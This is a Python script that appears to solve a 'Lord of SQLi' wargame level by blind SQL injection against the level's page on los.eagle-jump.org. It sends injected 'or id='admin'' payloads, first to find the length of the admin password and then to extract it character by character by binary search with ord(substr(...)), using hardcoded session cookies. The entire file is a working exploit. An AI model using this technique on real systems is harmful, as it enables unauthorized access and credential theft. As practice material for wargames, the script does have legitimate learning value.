import requests

def password_length():
	length=0
	while 1:
		length += 1
		query_add = query+"?pw=' or id='admin' and length(pw)="+str(length)+" --%20"
		result=requests.get(query_add, cookies=cookie)
		#print(result.text.find("Hello"))
		if(result.text.find("Hello")<=2500 and result.text.find("Hello")>0):
			print("Length is : "+str(length))
			return length

def password(index):
	first=0
	last=255
	while(first<last):
		mid=(first+last)//2
		query_add=query+"?pw=' or id='admin' and ord(substr(pw,"+str(index)+",1))>="+str(mid)+" --%20"
		result=requests.get(query_add, cookies=cookie)
		#print(first, last, result.text.find("Hello"))
		if(result.text.find("Hello")<=2500 and result.text.find("Hello")>0):
			first=mid
			if(last==first+1):
				query_add=query+"?pw=' or id='admin' and ord(substr(pw,"+str(index)+",1))="+str(first)+" --%20"
				result=requests.get(query_add, cookies=cookie)
				if(result.text.find("Hello")<=2500 and result.text.find("Hello")>0):
					#print(hex(first))
					return first
				else:
					#print(hex(last))
					return last
		else:
			last=mid-1
	#print(hex(first))
	return first

if(__name__=="__main__"):
	cookie={"__cfduid":"d5fd3bf70d66481907d3d06087b88ff011549863094","PHPSESSID":"afuov7bqip2lbk1o06n42o7g45"}
	query='https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php'
	length=password_length()
	for i in range(1, length+1):
		print(chr(password(i)),end="")